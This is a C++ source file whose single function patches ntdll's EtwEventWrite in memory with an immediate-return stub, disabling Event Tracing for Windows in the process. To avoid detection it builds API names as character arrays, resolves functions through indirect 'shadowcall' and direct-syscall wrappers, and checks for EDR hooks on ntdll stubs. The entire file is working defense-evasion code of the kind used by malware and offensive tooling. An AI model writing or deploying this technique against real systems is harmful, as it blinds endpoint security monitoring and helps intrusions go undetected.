#include "blind.h"
#include "error.h"
#include "shadowsyscall.hpp"

bool hooked(LPVOID addr) {
  BYTE stub[] = "\x4c\x8b\xd1\xb8";
  return memcmp(addr, stub, 4) != 0;
}

void patch_etw_event_write() {
  HANDLE handle = GetCurrentProcess();

  if (handle == nullptr) {
    throw AppError("failed to get current process handle");
  }

  const char ntdll_str[] = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0};
  const char alloc_str[] = {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a',
                            't', 'e', 'V', 'i', 'r', 't', 'u', 'a',
                            'l', 'M', 'e', 'm', 'o', 'r', 'y', 0};
  const char protect_str[] = {'N', 't', 'P', 'r', 'o', 't', 'e', 'c',
                              't', 'V', 'i', 'r', 't', 'u', 'a', 'l',
                              'M', 'e', 'm', 'o', 'r', 'y', 0};
  const char etw_str[] = {'E', 't', 'w', 'E', 'v', 'e', 'n',
                          't', 'W', 'r', 'i', 't', 'e', 0};

  HMODULE ntdll_handle = shadowcall<HMODULE>("GetModuleHandleA", ntdll_str);

  if (ntdll_handle == nullptr) {
    throw AppError("failed to get ntdll handle");
  }

  LPVOID protect_addr =
      shadowcall<LPVOID>("GetProcAddress", ntdll_handle, protect_str);

  if (hooked(protect_addr)) {
    throw AppError("NtProtectVirtualMemory is hooked");
  }

  LPVOID alloc_addr =
      shadowcall<LPVOID>("GetProcAddress", ntdll_handle, alloc_str);

  if (hooked(alloc_addr)) {
    throw AppError("NtAllocateVirtualMemory is hooked");
  }

  LPVOID etw_addr = shadowcall<LPVOID>("GetProcAddress", ntdll_handle, etw_str);

  if (etw_addr == nullptr) {
    throw AppError("failed to get EtwEventWrite address");
  }

  DWORD old_protect = 0;
  uint8_t patch[] = {0x48, 0x33, 0xc0, 0xc3};
  SIZE_T min_size = 0x1000;
  LPVOID current_addr = etw_addr;

  NTSTATUS status =
      shadowsyscall<NTSTATUS>("NtProtectVirtualMemory", handle, &current_addr,
                              &min_size, PAGE_EXECUTE_READWRITE, &old_protect);

  if (!NT_SUCCESS(status)) {
    throw AppError("failed to change memory protection");
  }

  status = shadowsyscall<NTSTATUS>("NtWriteVirtualMemory", handle, etw_addr,
                                   patch, sizeof(patch), nullptr);

  if (!NT_SUCCESS(status)) {
    throw AppError("failed to write to EtwEventWrite");
  }

  status =
      shadowsyscall<NTSTATUS>("NtProtectVirtualMemory", handle, &current_addr,
                              &min_size, old_protect, &old_protect);

  if (!NT_SUCCESS(status)) {
    throw AppError("failed to change memory protection");
  }

  return;
}
